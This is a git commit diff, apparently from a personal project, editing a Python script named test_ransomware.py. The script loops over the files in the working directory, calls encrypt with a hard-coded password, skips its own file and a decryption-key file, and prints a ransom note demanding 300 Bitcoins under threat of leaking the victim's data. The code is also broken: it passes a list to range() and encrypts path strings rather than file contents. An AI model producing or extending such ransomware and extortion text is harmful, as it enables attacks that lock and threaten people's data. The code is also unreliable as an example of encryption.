9d68d6bac2689dc511cadff56992a12afb24622e
ArkaGoel <77157313+ArkaGoel@users.noreply.github.com>
2023-08-19 23:07:29 +0530

    Add files via upload

--- test_ransomware.py
+++ test_ransomware.py
@@ -3,9 +3,11 @@ from simplecrypt import encrypt
 
 file_path = os.getcwd()
 list_dir = os.listdir(file_path)
+files = os.path.basename(str(list_dir))
 for i in range(list_dir):
-    file = list_dir[i]
-    file_path_new = file_path + '\\' + file
-    files_e = encrypt('Hacked@H1', file_path_new)
-    hex_of_e = files_e.hex()
-    print("Hahahahahaha! Files Encrypted\n Send 300 Bitcoins in 3 days for not revealing your data to the world! and you will get an email on how to retrieve your files back!")
+    if(list_dir[i] != "test_ransomware.py" and list_dir[i] != "decryption_key.py"):
+        file = list_dir[i]
+        file_path_new = file_path + '\\' + file
+        files_e = encrypt('Hacked@H1', file_path_new)
+        hex_of_e = files_e.hex()
+print("Hahahahahaha! Files Encrypted\n Send 300 Bitcoins in 3 days for not revealing your data to the world! and you will get an email on how to retrieve your files back!")
